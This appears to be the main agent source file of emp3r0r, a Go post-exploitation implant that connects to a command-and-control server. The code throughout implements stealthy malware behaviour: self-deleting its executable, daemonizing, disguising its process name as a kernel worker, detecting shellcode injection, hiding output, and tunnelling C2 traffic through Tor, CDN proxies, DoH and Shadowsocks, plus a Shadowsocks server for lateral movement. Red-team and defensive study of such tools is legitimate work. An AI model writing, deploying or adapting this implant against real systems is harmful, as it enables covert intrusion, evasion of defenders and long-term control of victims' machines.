package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
)

func agent_main() {
	var err error
	replace_agent := false

	// check if this process is invoked by guardian shellcode
	// by checking if process executable is same as parent's
	is_injected := util.ProcExePath(os.Getpid()) ==
		util.ProcExePath(os.Getppid())

	// accept env vars
	verbose := os.Getenv("VERBOSE") == "true"
	if verbose {
		log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
		log_file := "emp3r0r.log"
		f, err := os.OpenFile(log_file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			log.Fatalf("[-] Cannot open %s: %v", log_file, err)
		}
		defer f.Close()
		log.SetOutput(f)
		log.Println("emp3r0r agent has started")
	} else {
		log.SetOutput(io.Discard)
		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
		if err != nil {
			log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
		}
		defer null_file.Close()
		os.Stderr = null_file
		os.Stdout = null_file
	}

	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
	// self delete or not
	persistence := os.Getenv("PERSISTENCE") == "true"
	// are we running from loader.so?
	is_dll := IsDLL()
	if is_dll {
		// we don't want to delete the process executable if we are just a DLL
		persistence = true
	}

	do_not_touch_argv := is_dll || is_injected
	renameProcessIfNeeded(persistence, do_not_touch_argv)
	exe_path := util.ProcExePath(os.Getpid())
	daemonizeIfNeeded(verbose, is_dll, exe_path)

	// self delete
	self_delete := !is_dll && !is_injected && !persistence && runtime.GOOS == "linux"
	if self_delete {
		err = deleteCurrentExecutable()
		if err != nil {
			log.Printf("Error removing agent file from disk: %v", err)
		}
	}

	// applyRuntimeConfig
	log.Println("Applying runtime config...")
	err = agent.ApplyRuntimeConfig()
	if err != nil {
		log.Fatalf("ApplyRuntimeConfig: %v", err)
	}

	if is_injected {
		// restore original executable file
		err = util.Copy(
			fmt.Sprintf("%s/%s",
				agent.RuntimeConfig.AgentRoot,
				util.FileBaseName(util.ProcExePath(os.Getpid()))),
			util.ProcExePath(os.Getpid()))
		if err != nil {
			log.Printf("failed to restore original executable: %v", err)
		}
	}

	if !is_dll {
		// don't be hasty
		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
	}

	if runtime.GOOS == "linux" {
		// mkdir -p UtilsPath
		// use absolute path
		if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
			err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0o700)
			if err != nil {
				log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
			}
		}

		// PATH
		agent.SetPath()

		// set HOME to correct value
		setupEnvironment()

		// remove *.downloading files
		cleanUpDownloadingFiles()

		if is_injected || is_dll {
			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
				os.Getpid(), os.Getppid())
		}
	}

test_agent:
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Printf("Failed to find agent process with PID %d: %v", pid, err)
		}

		// check if agent is responsive
		if isAgentAliveSocket() {
			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
				log.Println("Escalating privilege...")
			} else if !replace_agent {
				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
					os.Getppid(),
					os.Getpid())

				util.TakeASnap()
				goto test_agent
			}
		} else {
			go socketListen()
		}

		// if agent is not responsive, kill it, and start a new instance
		// after IsAgentAlive(), the PID file gets replaced with current process's PID
		// if we kill it, we will be killing ourselves
		if proc.Pid != os.Getpid() {
			err = proc.Kill()
			if err != nil {
				log.Printf("Failed to kill existing emp3r0r agent: %v", err)
			}
		}
	} else {
		go socketListen()
	}

	// if CC is behind tor, a proxy is needed
	if tun.IsTor(emp3r0r_def.CCAddress) {
		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
		// by default we use 443, so configure your torrc accordingly
		emp3r0r_def.CCAddress = fmt.Sprintf("%s/", emp3r0r_def.CCAddress)
		log.Printf("CC is on TOR: %s", emp3r0r_def.CCAddress)
		if agent.RuntimeConfig.C2TransportProxy == "" {
			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
		}
		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_def.CCAddress, agent.RuntimeConfig.C2TransportProxy)
	} else {
		// parse C2 address
		// append CCPort to CCAddress
		emp3r0r_def.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_def.CCAddress, agent.RuntimeConfig.CCPort)
	}
	log.Printf("CCAddress is: %s", emp3r0r_def.CCAddress)

	// DNS
	if agent.RuntimeConfig.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			agent.RuntimeConfig.DoHServer,
			dns.DoHCache())
		if err != nil {
			log.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	upper_proxy := agent.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
	if agent.RuntimeConfig.CDNProxy != "" {
		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if agent.RuntimeConfig.DoHServer != "" {
			dns = agent.RuntimeConfig.DoHServer
		}
		go func() {
			for !tun.IsProxyOK(cdnproxyAddr, emp3r0r_def.CCAddress) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
				if err != nil {
					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
	}

	// enable shadowsocks / kcp
	if agent.RuntimeConfig.UseShadowsocks {
		// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
		agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
			agent.RuntimeConfig.ShadowsocksLocalSocksPort)

		// run ss w/wo KCP
		go agent.ShadowsocksC2Client()
		go agent.KCPC2Client() // KCP client will run when UseKCP is set
	}

	// do we have internet?
	checkInternet := func(cnt *int) bool {
		if isC2Reachable() {
			// if we do, we are feeling helpful
			if *cnt == 0 {
				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
				ctx, cancel := context.WithCancel(context.Background())
				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
			}
			return true

		} else if !tun.IsTor(emp3r0r_def.CCAddress) &&
			!tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress) {
			// we don't, just wait for some other agents to help us
			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
			if *cnt == 0 {
				go func() {
					ctx, cancel := context.WithCancel(context.Background())
					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
					err := agent.BroadcastServer(ctx, cancel, "")
					if err != nil {
						log.Fatalf("BroadcastServer: %v", err)
					}
				}()
			}
			*cnt++
			return false
		}
		return true
	}
	i := 0
	for !checkInternet(&i) {
		log.Printf("[%d] Checking Internet connectivity...", i)
		if agent.RuntimeConfig.C2TransportProxy != "" {
			log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.C2TransportProxy)
			break
		}
		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
	}
	go agent.ShadowsocksServer() // start shadowsocks server for lateral movement

connect:
	// apply whatever proxy setting we have just added
	emp3r0r_def.HTTPClient = tun.EmpHTTPClient(emp3r0r_def.CCAddress, agent.RuntimeConfig.C2TransportProxy)
	if emp3r0r_def.HTTPClient == nil {
		log.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
		util.TakeASnap()
		goto connect
	}
	if agent.RuntimeConfig.C2TransportProxy != "" {
		log.Printf("Using proxy: %s", agent.RuntimeConfig.C2TransportProxy)
	} else {
		log.Println("Not using proxy")
	}

	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
		agent.RuntimeConfig.CCIndicator != "" &&
		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not

		if !agent.IsCCOnline(agent.RuntimeConfig.C2TransportProxy) {
			log.Println("CC not online")
			time.Sleep(time.Duration(
				util.RandInt(
					agent.RuntimeConfig.IndicatorWaitMin,
					agent.RuntimeConfig.IndicatorWaitMax)) * time.Minute)
			goto connect
		}
	}
	log.Printf("Checking in on %s", emp3r0r_def.CCAddress)

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Printf("CheckIn error: %v, sleeping, will retry later", err)
		util.TakeASnap()
		goto connect
	}
	log.Printf("Checked in on CC: %s", emp3r0r_def.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	token := uuid.NewString() // dummy token
	msgURL := fmt.Sprintf("%s%s/%s",
		emp3r0r_def.CCAddress,
		tun.MsgAPI,
		token)
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	emp3r0r_def.CCMsgConn = conn
	if err != nil {
		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
		util.TakeASnap()
		goto connect
	}
	emp3r0r_def.KCPKeep = true
	log.Println("Connecting to CC NsgTun...")
	agent.CCMsgTun(ctx, cancel)
	log.Printf("CC MsgTun closed, reconnecting")
	goto connect
}

func daemonizeIfNeeded(verbose, is_shared_lib bool, exe_path string) {
	log.Println("daemonizeIfNeeded...")
	if runtime.GOOS == "linux" && !verbose && os.Getenv("DAEMON") != "true" && !is_shared_lib {
		log.Println("Daemonizing...")
		os.Setenv("DAEMON", "true")
		cmd := exec.Command(exe_path)
		cmd.Env = os.Environ()
		err := cmd.Start()
		if err != nil {
			log.Fatalf("Daemonize: %v", err)
		}
		os.Exit(0)
	}
}

func renameProcessIfNeeded(persistent, do_not_touch_argv bool) {
	log.Println("renameProcessIfNeeded...")
	if !persistent && !do_not_touch_argv && runtime.GOOS == "linux" {
		log.Println("Renaming process...")
		// rename our agent process to make it less suspecious
		// this does nothing in Windows
		agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
			util.RandInt(1, 20),
			util.RandInt(0, 6)))
	}
}

func setupEnvironment() {
	log.Println("setupEnvironment...")
	u, err := user.Current()
	if err != nil {
		log.Printf("Get user info: %v", err)
	} else {
		os.Setenv("HOME", u.HomeDir)
	}
	emp3r0r_def.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
	if runtime.GOOS == "windows" {
		emp3r0r_def.DefaultShell = "elvish"
	} else if !util.IsFileExist(emp3r0r_def.DefaultShell) {
		emp3r0r_def.DefaultShell = "/bin/bash"
		if !util.IsFileExist(emp3r0r_def.DefaultShell) {
			emp3r0r_def.DefaultShell = "/bin/sh"
		}
	}
}

func cleanUpDownloadingFiles() {
	log.Println("cleanUpDownloadingFiles...")
	err := filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(info.Name(), ".downloading") {
			os.RemoveAll(path)
		}
		return nil
	})
	if err != nil {
		log.Printf("Cleaning up *.downloading: %v", err)
	}
}

func deleteCurrentExecutable() error {
	log.Println("deleteCurrentExecutable...")
	selfPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	if runtime.GOOS == "windows" {
		return nil // not implemented and not needed
	} else {
		err = os.Remove(selfPath)
		if err != nil {
			return fmt.Errorf("failed to delete executable on Linux: %v", err)
		}
	}
	return nil
}
